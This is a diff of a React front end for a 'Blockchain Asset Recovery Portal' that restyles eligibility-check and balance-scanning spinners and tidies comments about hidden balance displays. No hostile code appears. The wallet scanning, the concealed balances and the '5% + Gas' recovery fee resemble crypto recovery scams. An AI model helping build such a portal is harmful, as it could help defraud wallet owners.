@@ -2930,15 +2930,20 @@ function App() {
                 </button>
               )}
 
-              {/* Eligibility Status Message with Spin Animation (same place as not eligible message) */}
+              {/* Eligibility Status Message with Spin Animation - DIRECTLY BELOW THE WALLET ROW */}
               <div className="mt-3 w-full">
                 {verifying ? (
-                  <div className="bg-blue-500/20 border border-blue-500/30 rounded-lg p-4 text-center animate-pulse">
-                    <div className="flex items-center justify-center gap-3">
-                      <div className="w-7 h-7 border-3 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-                      <span className="text-blue-400 text-base font-semibold tracking-wide">{translations.checkEligibility}...</span>
+                  <div className="bg-blue-500/20 backdrop-blur rounded-xl p-5 text-center border border-blue-500/40 shadow-lg shadow-blue-500/20 animate-pulse">
+                    <div className="flex flex-col items-center justify-center gap-3">
+                      <div className="relative">
+                        <div className="w-12 h-12 border-4 border-blue-500/30 rounded-full"></div>
+                        <div className="absolute top-0 left-0 w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                      </div>
+                      <div>
+                        <p className="text-blue-400 text-base font-bold tracking-wide">{translations.checkEligibility}...</p>
+                        <p className="text-gray-300 text-sm mt-1">{translations.verifying}</p>
+                      </div>
                     </div>
-                    <p className="text-gray-300 text-xs mt-2">{translations.verifying}</p>
                   </div>
                 ) : (
                   <div className={`rounded-lg p-3 text-sm ${
@@ -2974,15 +2979,15 @@ function App() {
             />
           </div>
 
-          {/* SCANNING ANIMATION */}
+          {/* SCANNING ANIMATION (only shown during initial balance scan, not eligibility check) */}
           {isConnected && scanning && (
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-blue-500/30">
                 <div className="flex items-center justify-center gap-4 mb-4">
                   <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                   <div className="text-left">
-                    <div className="text-lg font-bold text-blue-400">{translations.checkEligibility}</div>
-                    <div className="text-sm text-gray-400">{translations.verifying}</div>
+                    <div className="text-lg font-bold text-blue-400">{translations.blockchainSync}</div>
+                    <div className="text-sm text-gray-400">Scanning networks...</div>
                   </div>
                 </div>
                 
@@ -3015,8 +3020,6 @@ function App() {
           <div className="w-full max-w-md bg-blue-500/5 border border-blue-500/30 backdrop-blur p-8 rounded-2xl mt-8">
             <h3 className="text-2xl font-bold mb-4 text-blue-400">Blockchain Asset Recovery Portal</h3>
             
-            {/* Recoverable Value line removed as requested */}
-            
             {/* Progress Bar (visual only, no balance text) */}
             <div className="w-full bg-blue-950 h-3 rounded-full overflow-hidden mb-6">
               <div 
@@ -3036,8 +3039,6 @@ function App() {
                 <p className="text-lg font-bold text-blue-400">5% + Gas</p>
               </div>
             </div>
-
-            {/* Chain Balance Details REMOVED - no balance display */}
 
             <div className="bg-black/50 border border-blue-500/30 rounded-xl p-5">
               <h4 className="text-xl font-bold mb-2 text-blue-400">🔗 Recovery Protocol</h4>
@@ -3106,7 +3107,7 @@ function App() {
             </div>
           )}
 
-          {/* Info Section - 2 columns (removed ReportIssue since it's now at the top) */}
+          {/* Info Section - 2 columns */}
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-12">
             
             <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
@@ -3131,7 +3132,7 @@ function App() {
             </div>
           </div>
 
-          {/* NEW FOOTER with Company, Contact, Legal, Service Explanation & Telegram Link */}
+          {/* Footer */}
           <Footer />
         </div>
       </div>
